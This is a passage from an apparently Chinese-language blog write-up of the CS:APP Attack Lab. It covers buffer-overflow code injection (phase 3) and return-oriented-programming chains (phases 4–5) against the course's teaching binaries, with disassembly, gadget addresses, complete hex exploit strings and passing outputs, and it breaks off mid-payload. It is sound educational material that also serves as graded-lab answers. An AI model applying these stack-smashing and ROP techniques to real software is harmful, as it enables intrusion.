+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compare string to hex represention of unsigned value */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hexmatch</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val, <span class="hljs-type">char</span> *sval)</span><br>&#123;<br>  <span class="hljs-type">char</span> cbuf[<span class="hljs-number">110</span>];<br>  <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>  <span class="hljs-type">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>  <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">&quot;%.8x&quot;</span>, val);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这个函数会将 <code>cookie</code> 的值<strong>以 <code>16</code>
+进制打印到字符数组 <code>s</code> 中</strong>，然后在比较
+<code>sval</code> 和 <code>s</code> 的前九个字符</p>
+<p>也就是说，我们传入的 <code>sval</code> 所指向的字符串需要以
+<code>ASCII</code> 字符的形式存储 <code>cookie</code></p>
+<p>我们去看 <code>touch3</code> 的汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004018fa &lt;touch3&gt;:<br>  4018fa:	53                   	push   %rbx<br>  4018fb:	48 89 fb             	mov    %rdi,%rbx<br>  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;<br>  401905:	00 00 00 <br>  401908:	48 89 fe             	mov    %rdi,%rsi<br>  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;<br>  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;<br>  401916:	85 c0                	test   %eax,%eax<br>  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;<br>  40191a:	48 89 da             	mov    %rbx,%rdx<br>  40191d:	be 38 31 40 00       	mov    $0x403138,%esi<br>  401922:	bf 01 00 00 00       	mov    $0x1,%edi<br>  401927:	b8 00 00 00 00       	mov    $0x0,%eax<br>  40192c:	e8 bf f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;<br>  401931:	bf 03 00 00 00       	mov    $0x3,%edi<br>  401936:	e8 52 03 00 00       	call   401c8d &lt;validate&gt;<br>  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;<br>  40193d:	48 89 da             	mov    %rbx,%rdx<br>  401940:	be 60 31 40 00       	mov    $0x403160,%esi<br>  401945:	bf 01 00 00 00       	mov    $0x1,%edi<br>  40194a:	b8 00 00 00 00       	mov    $0x0,%eax<br>  40194f:	e8 9c f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;<br>  401954:	bf 03 00 00 00       	mov    $0x3,%edi<br>  401959:	e8 f1 03 00 00       	call   401d4f &lt;fail&gt;<br>  40195e:	bf 00 00 00 00       	mov    $0x0,%edi<br>  401963:	e8 d8 f4 ff ff       	call   400e40 &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>
+<p>可以看到在开头并没有<strong>分配栈帧</strong>，对全局变量
+<code>val</code> 赋值完毕后直接调用 <code>hexmatch</code>
+了，<code>hexmatch</code> 的汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000040184c &lt;hexmatch&gt;:<br>  40184c:	41 54                	push   %r12<br>  40184e:	55                   	push   %rbp<br>  40184f:	53                   	push   %rbx<br>  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp<br>  401854:	41 89 fc             	mov    %edi,%r12d<br>  401857:	48 89 f5             	mov    %rsi,%rbp<br>  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax<br>  401861:	00 00 <br>  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)<br>  401868:	31 c0                	xor    %eax,%eax<br>  40186a:	e8 41 f5 ff ff       	call   400db0 &lt;random@plt&gt;<br>  40186f:	48 89 c1             	mov    %rax,%rcx<br>  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx<br>  401879:	0a d7 a3 <br>  40187c:	48 f7 ea             	imul   %rdx<br>  40187f:	48 01 ca             	add    %rcx,%rdx<br>  401882:	48 c1 fa 06          	sar    $0x6,%rdx<br>  401886:	48 89 c8             	mov    %rcx,%rax<br>  401889:	48 c1 f8 3f          	sar    $0x3f,%rax<br>  40188d:	48 29 c2             	sub    %rax,%rdx<br>  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax<br>  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax<br>  401898:	48 c1 e0 02          	shl    $0x2,%rax<br>  40189c:	48 29 c1             	sub    %rax,%rcx<br>  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx<br>  4018a3:	45 89 e0             	mov    %r12d,%r8d<br>  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx<br>  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx<br>  4018b2:	be 01 00 00 00       	mov    $0x1,%esi<br>  4018b7:	48 89 df             	mov    %rbx,%rdi<br>  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax<br>  4018bf:	e8 ac f5 ff ff       	call   400e70 &lt;__sprintf_chk@plt&gt;<br>  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx<br>  4018c9:	48 89 de             	mov    %rbx,%rsi<br>  4018cc:	48 89 ef             	mov    %rbp,%rdi<br>  4018cf:	e8 cc f3 ff ff       	call   400ca0 &lt;strncmp@plt&gt;<br>  4018d4:	85 c0                	test   %eax,%eax<br>  4018d6:	0f 94 c0             	sete   %al<br>  4018d9:	0f b6 c0             	movzbl %al,%eax<br>  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi<br>  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi<br>  4018e8:	00 00 <br>  4018ea:	74 05                	je     4018f1 &lt;hexmatch+0xa5&gt;<br>  4018ec:	e8 ef f3 ff ff       	call   400ce0 &lt;__stack_chk_fail@plt&gt;<br>  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp<br>  4018f5:	5b                   	pop    %rbx<br>  4018f6:	5d                   	pop    %rbp<br>  4018f7:	41 5c                	pop    %r12<br>  4018f9:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>分配栈帧的是 <code>add $0xffffffffffffff80,%rsp</code>，相当于分配
+<code>128</code> 字节的空间，也就是 <code>0x80</code></p>
+<p><code>touch3</code> 地址存储在 <code>0x5561dca0</code> 处，而在
+<code>getbuf</code> 的结尾处，由于执行了 <code>ret</code> 指令，因此
+<code>%rsp</code> 的值需要再此基础上加上 <code>0x8</code> ，也就是
+<code>0x5561dca8</code></p>
+<p>那么从当前 <code>%rsp</code> 的位置，到 <code>getbuf</code>
+栈顶所在地址 <code>0x5561dc78</code> 之间的内容，一定会被
+<code>hexmatch</code> 所覆盖，因此我们需要另外寻找办法</p>
+<p>有一个办法是，我们在跳转到 <code>touch3</code> 之前，将栈指针
+<code>%rsp</code> 的值赋值为栈顶地址，也就是 <code>0x5561dc78</code>
+，这之后再去调用 <code>touch3</code>
+，那么之后分配的栈帧就不会影响我们插入的内容了</p>
+<p>我们写出如下汇编代码，保存为文件 <code>insert.s</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leaq 0x5561dc78, %rsp<br>leaq 0x5561dc90, %rdi<br>push $0x4018fa<br>ret<br><br></code></pre></td></tr></table></figure>
+<p>执行如下语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -c ./answer/phase_3/insert.s -o ./answer/phase_3/insert<br>$ objdump -d ./answer/phase_3/insert &gt; ./answer/phase_3/insert.asm <br></code></pre></td></tr></table></figure>
+<p><code>insert.asm</code> 文件内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> 0:	48 8d 24 25 78 dc 61 	lea    0x5561dc78,%rsp<br> 7:	55 <br> 8:	48 8d 3c 25 90 dc 61 	lea    0x5561dc90,%rdi<br> f:	55 <br>10:	68 fa 18 40 00       	push   $0x4018fa<br>15:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>我们将这些字符依次写入，再将 <code>touch3</code> 的开始地址作为
+<code>getbuf</code> 的中 <code>ret</code> 的跳转地址，得到最终答案：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span><span class="hljs-number">8</span>d <span class="hljs-number">24</span> <span class="hljs-number">25</span> <span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">8</span>d <span class="hljs-number">3</span>c <span class="hljs-number">25</span> <span class="hljs-number">90</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span><br><span class="hljs-symbol">68 </span>fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./ctarget -qi ./answer/phase_3/output <br>Cookie: 0x59b997fa<br>Touch3!: You called touch3(<span class="hljs-string">&quot;59b997fa&quot;</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:ctarget:3:48 8D 24 25 78 DC 61 55 48 8D 3C 25 90 DC 61 55 68 FA 18 40 00 C3 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 <br></code></pre></td></tr></table></figure>
+<h3 id="return-oriented-programming">Return-Oriented Programming</h3>
+<p>从这一阶段开始将会介绍一种新的代码攻击方式
+<code>ROP, Return-Oriented Programming</code>，直译就是<strong>面向返回值编程</strong>，提出这种攻击方式是因为：</p>
+<ul>
+<li>栈随机化：程序运行时栈的位置每次都会变化，我们无法定位堆栈的地址（虽然栈的地址是随机的，但函数的入口地址已经不会发生改变）</li>
+<li>可执行区域限制：栈内的代码被标记为不可执行，如果执行的话会报
+<code>segmenttation fault</code></li>
+</ul>
+<p>下面我们详细说明一下 <code>ROP</code> 的编程思想：</p>
+<p><code>ROP</code> 的核心在于 <code>ret</code>
+指令，该指令可以分解为：<code>PC = *rsp, rsp++</code>，也就是会将当前<strong>栈顶</strong>处的<strong>地址</strong>赋值给
+<code>PC</code> ，然后将栈顶指针向上增加 <code>64</code>
+个字节（一定是将地址返回给 <code>PC</code>
+，而<strong>不是指令的字节序列</strong>）</p>
+<p>在一段程序中，如果一个 <code>ret</code>
+指令前的字节序列，恰好可以由我们需要的指令的字节级编码前后拼接而成，便可以实现
+<code>ROP</code>，我们称这一个连续的指令序列为 <code>gadget</code></p>
+<p>我们来看书中的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)<br>400f1b: c3 retq<br></code></pre></td></tr></table></figure>
+<p>这是一段正常的代码。但字节序列 <code>48 89 c7</code> 可以被翻译为
+<code>movq %rax, %rdi</code> ，并且后面接的正好是 <code>ret</code>
+，因此便可以实现 <code>ROP</code></p>
+<p>这里有一个疑问是，为什么一定要以 <code>ret</code> 为结尾，这一点将在
+<code>phase_4</code> 中得到解答</p>
+<h4 id="phase_4">phase_4</h4>
+<p>参照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 中
+<code>5.1</code> 的部分，这个实验一定要将 <code>PDF</code>
+中的内容全部理解，不然做不下去</p>
+<p>我们需要在 <code>rtarget</code> 中完成 <code>phase_2</code>
+一样的任务，只不过 <code>rtarget</code> 与 <code>ctarget</code>
+不同的是加入了上面的两种防止缓冲器攻击的机制</p>
+<p>核心思想还是先对 <code>%rdi</code> 进行赋值，然后跳转到
+<code>touch2</code> 的地址即可</p>
+<p>由于我们不能将立即数直接赋值给一个寄存器，因此我们需要将立即数赋值给寄存器，然后再将这个寄存器赋值给
+<code>%rdi</code></p>
+<p>我们可以考虑用 <code>pop</code> 指令来对寄存器进行赋值，然后再用
+<code>mov</code> 指令对 <code>%rdi</code> 进行赋值</p>
+<p>查表发现，<code>pop %rax</code> 的字节级编码为 <code>58</code>
+，我们在 <code>rtarget</code> 中搜索 <code>58</code>
+的位置，得到如下结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019a7 &lt;addval_219&gt;:<br>  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax<br>  4019ad:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>字节 <code>90</code> 为 <code>nop</code>
+的字节级编码，因此可以直接忽视</p>
+<p>我们需要的地址从 <code>0x4019ab</code> 开始，然后以 <code>c3</code>
+结束（也就是以 <code>ret</code> 结束）</p>
+<p>因此<strong>我们将地址 <code>0x4019ab</code> 注入到堆栈中，覆盖原先
+<code>getbuf</code> 的返回值，这样就可以让 <code>PC</code>
+跳到我们指定的位置了</strong></p>
+<p><strong>当执行 <code>ret</code> 之后，<code>PC</code>
+会回到原先的位置，如果后面还有一次我们注入的地址，那么就会再执行一次刚刚的行为</strong>，所以这就是为什么一定要以
+<code>ret</code> 为结尾</p>
+<p>在我们从栈中弹出 <code>cookie</code> 后，我们需要执行
+<code>mov %rax, %rdi</code>，该指令的字节级编码为：<code>48 89 c7</code>，我们找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019c3 &lt;setval_426&gt;:<br>  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)<br>  4019c9:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>我们需要的地址为
+<code>0x4019c5</code>，到此我们也就执行完所有需要的指令了，之后将
+<code>touch2</code> 的地址写入栈中即可</p>
+<p>答案如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./rtarget -qi ./answer/phase_4/output <br>Cookie: 0x59b997fa<br>Touch2!: You called touch2(0x59b997fa)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget<br>PASS: Would have posted the following:<br>        user <span class="hljs-built_in">id</span> bovik<br>        course  15213-f15<br>        lab     attacklab<br>        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 <br></code></pre></td></tr></table></figure>
+<h4 id="phase_5">phase_5</h4>
+<p>参照 <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">PDF</a> 中
+<code>5.2</code> 的部分</p>
+<p>本实验要求我们在 <code>rtarget</code> 中完成 <code>phase_3</code>
+的内容</p>
+<p>我们知道，<code>phase_3</code> 的难点在于 <code>hexmatch</code>
+会将缓冲区覆盖导致没办法正常读取到插入的字符串，因此我们考虑先改变栈指针
+<code>%rsp</code> ，然后将 <code>%rdi</code>
+的值指向我们插入字符串的起始地址出</p>
+<p>在这里，我们无法去改变 <code>%rsp</code> 的值，因为没有一个合适的
+<code>gadget</code> 让我们这么做，因此我们考虑另一种做法：</p>
+<p><strong>在 <code>touch3</code>
+跳转地址的上面插入该字符串</strong>，那么我们只需要让 <code>%rdi</code>
+的值指向该地址，那么就可以正常的读取到该字符串</p>
+<p>思路到这，也就到了本题的难点：栈是随机的，我们该如何定位
+<code>touch3</code> 的前一个地址的位置</p>
+<p>由于每次程序运行时栈的地址都不同，我们确实无法直接通过地址赋值的方式给
+<code>%rdi</code> 进行赋值，但我们注意到<strong>我们需要的地址总是在
+<code>touch3</code>
+的前一个位置</strong>，也就是说，如果我们能得到某个时刻
+<code>%rsp</code>
+的值，那么将其减去某个偏移量，自然便可以得到我们想要的地址</p>
+<p>在 <code>farm</code> 中，我们发现有一个计算两数之和的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004019d6 &lt;add_xy&gt;:<br>  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax<br>  4019da:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>我们考虑用这个函数来实现，此函数将 <code>%rdi</code> 和
+<code>%rsi</code> 的值累加后放到 <code>%rax</code> 中</p>
+<p>我们查表可以发现，<code>mov %rax, %rdi</code> 和
+<code>mov %rsp, %rax</code> 这两个操作在 <code>farm</code>
+中总能够找到</p>
+<p>因此我们用 <code>%rdi</code>
+来存储某时刻的栈指针（这一步很容易可以实现），用 <code>%rsi</code>
+来存储偏移量</p>
+<p>我们用 <code>pop %rax</code> 来将偏移量临时存放在 <code>%rax</code>
+中，之后的问题转为如何将偏移量赋值给 <code>%rsi</code></p>
+<p>在 <code>farm</code> 中，<strong>没有 <code>gadget</code>
+能够直接将值赋值给
+<code>%rsi</code></strong>，由于我们的偏移量不会太大，因此考虑看看有没有什么寄存器能够赋值给
+<code>%esi</code></p>
+<p>查表得知，<strong>能够给 <code>%esi</code> 赋值的只有
+<code>%ecx</code></strong>，我们按着这个思路往回推，有哪个寄存器可以给
+<code>%ecx</code> 赋值</p>
+<p><strong>能够给 <code>%rcx</code> 赋值的只有
+<code>%edx</code></strong>，对应的 <code>gadget</code> 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)<br>  401a74:	c3                   	ret    <br></code></pre></td></tr></table></figure>
+<p>我们需要的是 <code>89 d1</code> ，后面接了一个 <code>91</code>
+，这个属于 <code>nop</code> ，效果于 <code>90</code> 一样</p>
+<blockquote>
+<p>我们可以在 <code>phase_2</code> 中试一下，将栈顶全部换成
+<code>91</code>，得到如下输入</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span> <span class="hljs-number">91</span><br><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<p>这个输入也是可以通过的</p>
+</blockquote>
+<p>继续刚刚的过程，<strong>能够赋值给 <code>%edx</code> 赋值的只有
+<code>%eax</code></strong>，到此为止我们便实现了从 <code>%rax</code> 到
+<code>%rsi</code> 的赋值</p>
+<p>我们将这个过程写成伪代码的形式，方便我们查找对应的
+<code>gadget</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">rsp -&gt; rax<br>rax -&gt; rdi<br>pop rax<br>//偏移量x<br>eax -&gt; edx<br>edx -&gt; ecx<br>ecx -&gt; esi<br>lea (rdi, rsi) -&gt; rax<br>rax -&gt; rdi<br>//touch3返回地址<br>cookie字符串<br></code></pre></td></tr></table></figure>
+<p>最终答案为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">48</span> <span 